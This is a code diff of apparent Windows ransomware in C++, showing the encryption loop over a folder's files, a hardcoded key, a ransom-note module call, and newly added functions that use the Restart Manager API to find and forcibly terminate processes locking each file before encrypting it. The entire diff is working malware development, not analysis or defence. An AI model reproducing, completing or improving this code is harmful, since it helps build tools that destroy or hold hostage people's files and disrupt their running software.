@@ -7,76 +7,27 @@ auto file_logger = spdlog::basic_logger_mt("file_logger", "logs/my_log.txt");
 void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCript);
 void encryptFile(const std::filesystem::path& path, const std::string& key);
 void decryptFile(const path_t& filePath, const std::string& key);
+void checkIfInUse(std::filesystem::path filePath);
+void terminateProcessById(DWORD processId);
 
 int main(int argc, char* argv[])
 {
     setlocale(LC_ALL, "Russian");
-
-    FileModule FileClass;
-    FileClass.FindDirectory();
-
-
-    path_t pathFolder = "C:/";
-    vector<path_t> PathToCript;
+    path_t directory = "C:/Users/-/Desktop/PureWare";
+    std::vector<path_t> pathToCript;
 
     file_logger->set_level(spdlog::level::info);
     file_logger->info("start the Cript");
 
-    path_t startPath = "C:/";
-    std::vector<path_t> pathToCript;
-    //traverseDirectory(startPath, pathToCript);
-    /*try {
-        if (filesystem::exists(pathFolder) && filesystem::is_directory(pathFolder)) {
-            for (const auto& entry : filesystem::directory_iterator(pathFolder)) {
-                auto filePath = entry.path();
-                if (entry.is_directory()) {
-                    // Ignore certain directories
-                    if (filePath == "C:/Documents and Settings" || filePath == "C:/System Volume Information") continue;
+    traverseDirectory(directory, pathToCript);
 
-                    // Check if directory is empty
-                    if (filesystem::is_empty(filePath)) {
-                        std::cout << "Directory is empty" << std::endl;
-                    }
-                    else {
-                        PathToCript.emplace_back(filePath);
-                        std::cout << "Directory is not empty" << std::endl;
-                    }
-                }
-                else if (entry.is_regular_file()) {
-                    // If it's a file, add it to the vector
-                    PathToCript.emplace_back(filePath);
-                    std::cout << "File added: " << filePath << std::endl;
-                }
-            }
+    string key{ 12 };
+    for (const auto& NextFile : pathToCript) {
+        file_logger->info("path {}", NextFile.string());
+        if (std::filesystem::is_regular_file(NextFile)) {
+            encryptFile(NextFile, key);
         }
     }
-    catch (const filesystem::filesystem_error& e) {
-        std::cerr << "Filesystem error: " << e.what() << std::endl;
-        file_logger->error("Eror is {}", e.what());
-        file_logger->error(GetLastError());
-    }
-    catch (const std::exception& e) {
-        std::cerr << "Standard exception: " << e.what() << std::endl;
-        file_logger->error("Eror is {}", e.what());
-        file_logger->error(GetLastError());
-    }
-    catch (...) {
-        file_logger->error("Unknown error occurred");
-        std::cerr << "Unknown error occurred" << std::endl;
-        file_logger->error(GetLastError());
-    }*/
-
-    path_t a = "C:/Users/zero/Desktop/1.txt";
-    encryptFile(a, "12");
-    file_logger->info("ok");
-    //decryptFile(a, "12");
-    /*string key{ 12 };
-    for (const auto& a : pathToCript) {
-        file_logger->info("path {}", a.string());
-        if (std::filesystem::is_regular_file(a)) {
-            encryptFile(a, key);
-        }
-    }*/
 
     NoteModule warn_user;
     warn_user.MakeSomeShit();
@@ -125,6 +76,9 @@ void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCript) {
 }
 
 void encryptFile(const std::filesystem::path& path, const std::string& key) {
+
+    checkIfInUse(path);
+
     // Проверка существования файла и доступности для чтения
     if (!std::filesystem::exists(path) || !std::filesystem::is_regular_file(path)) {
         file_logger->critical("Файл не найден или это не файл: {}", path.string());
@@ -183,6 +137,79 @@ void decryptFile(const path_t& filePath, const std::string& key) {
 
     fileOut.write(fileContent.data(), fileContent.size());
     fileOut.close();
+}
+
+void checkIfInUse(std::filesystem::path filePath)
+{
+    // Start a new Restart Manager session
+    DWORD dwSession;
+    WCHAR szSessionKey[CCH_RM_SESSION_KEY + 1] = { 0 };
+    DWORD dwError = RmStartSession(&dwSession, 0, szSessionKey);
+    if (dwError != ERROR_SUCCESS) {
+        file_logger->error("RmStartSession failed: ", dwError);
+        return;
+    }
+
+    // Register resources (files) to a Restart Manager session
+    LPCWSTR filePaths[] = { filePath.c_str() };
+    dwError = RmRegisterResources(dwSession, 1, filePaths, 0, NULL, 0, NULL);
+    if (dwError != ERROR_SUCCESS) {
+        file_logger->error("RmRegisterResources failed: ", dwError);
+        RmEndSession(dwSession);
+        return;
+    }
+
+    // Get the list of processes that are using the file
+    DWORD dwReason;
+    UINT nProcInfoNeeded = 0;
+    UINT nProcInfo = 0;
+    UINT ProcAm = 0;
+    RM_PROCESS_INFO* pids = nullptr;
+    dwError = RmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, NULL, &dwReason);
+    if (dwError == ERROR_MORE_DATA) {
+        // Some process is using the file
+        // Allocate space and call RmGetList again
+        nProcInfo = nProcInfoNeeded;
+        delete[] pids;
+        pids = new RM_PROCESS_INFO[nProcInfo]();
+        ProcAm = nProcInfo;
+        dwError = RmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, pids, &dwReason);
+    }
+
+    if (dwError == ERROR_SUCCESS && pids != nullptr) {
+        for (UINT i = 0; i < ProcAm; ++i) {
+            terminateProcessById(pids[i].Process.dwProcessId);
+        }
+    }
+    else {
+        file_logger->error("RmGetList failed: ", dwError);
+    }
+
+    delete[] pids;
+
+    // End the Restart Manager session
+    RmEndSession(dwSession);
+}
+
+void terminateProcessById(DWORD processId)
+{
+    HANDLE processHandle = NULL;
+
+    // Open the process
+    processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
+
+    if (processHandle == NULL) {
+        file_logger->error("OpenProcess() failed: ", GetLastError());
+        return;
+    }
+
+    // Terminate the process
+    if (!TerminateProcess(processHandle, 1)) {
+        file_logger->error("TerminateProcess() failed: ", GetLastError());
+    }
+
+    // Close the process handle
+    CloseHandle(processHandle);
 }
 
 // Public method that writes user's home directory to the private class variable "directory"
